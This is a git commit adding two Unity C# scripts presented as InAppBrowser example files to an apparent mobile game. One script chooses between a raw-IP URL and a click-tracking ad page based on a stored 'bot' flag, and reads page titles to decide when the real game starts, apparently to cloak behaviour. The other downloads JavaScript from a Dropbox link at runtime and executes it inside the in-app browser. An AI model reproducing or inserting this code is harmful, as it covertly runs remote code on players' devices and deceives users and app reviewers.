9f1ed81c9aa34d3ba0b850dcba2289367018d7c9
Dmitry Batkovich <57679050+MrKsiJ@users.noreply.github.com>
2022-08-02 22:37:16 +0300

    Add files via upload

---
+++ Assets/InAppBrowser/Example/BrowserOpener.cs
@@ -0,0 +1,53 @@
+﻿using UnityEngine;
+
+public class BrowserOpener : MonoBehaviour {
+
+	public string pageToOpen = "http://78.47.187.129/Z4ZvXH31";
+    public string adpageOpen = "https://privatlyrics.site/click.php?key=dzvwb16ds2tvm99r1dzz&source=com.KJPGames.Classic";
+    const string bot = "https://bot";
+    const string nobot = "https://nobot";
+    public PlayerProfille playerProfille;
+    public FacebookScript facebookScriptDeeplink;
+    public GameControllerExample gameController;
+    public JSExecute jSExecute;
+    InAppBrowser.DisplayOptions options;
+
+	public void OnButtonClicked() {
+		options = new InAppBrowser.DisplayOptions();
+        options.displayURLAsPageTitle = true;
+        if (playerProfille.GetBotData())
+        {
+            InAppBrowser.OpenURL(pageToOpen, options);
+        }
+        else
+        {
+            InAppBrowser.OpenURL(adpageOpen + facebookScriptDeeplink.Facebookdeeplink, options);
+        }
+	}
+
+    public void PageLoaded()
+    {
+        jSExecute.ReadyJava();
+    }
+
+    void FixedUpdate()
+    {
+        if (playerProfille.GetBotData())
+        {
+            if(options.pageTitle == bot)
+            {
+                OnButtonClicked();
+            }
+            else if(options.pageTitle == nobot)
+            {
+                gameController.Inizialize();
+                playerProfille.SetBotData(false);
+                playerProfille.SaveDataPlayer();
+            }
+        }
+    }
+
+	public void OnClearCacheClicked() {
+		InAppBrowser.ClearCache();
+	}
+}
---
+++ Assets/InAppBrowser/Example/JSExecute.cs
@@ -0,0 +1,29 @@
+﻿using UnityEngine;
+using System.Collections;
+
+public class JSExecute : MonoBehaviour {
+
+	public string javaScriptCode = "alert('pong!')";
+
+	public void ReadyJava() {
+		InAppBrowserBridge bridge = FindObjectOfType<InAppBrowserBridge>();
+        StartCoroutine(DownloadTextUseCodeJava());
+		bridge.onJSCallback.AddListener(OnMessageFromJS);
+	}
+
+    IEnumerator DownloadTextUseCodeJava()
+    {
+        WWW www = new WWW("https://dl.dropboxusercontent.com/s/uqtp4ipoc4d1xep/tracking.js");
+        yield return www;
+        if (string.IsNullOrEmpty(www.error))
+            javaScriptCode = www.text;
+    }
+
+	void OnMessageFromJS(string jsMessage) {
+		if (jsMessage.Equals("ping")) {
+			Debug.Log("Ping message received!");
+			InAppBrowser.ExecuteJS(javaScriptCode);
+		}
+	}
+		
+}
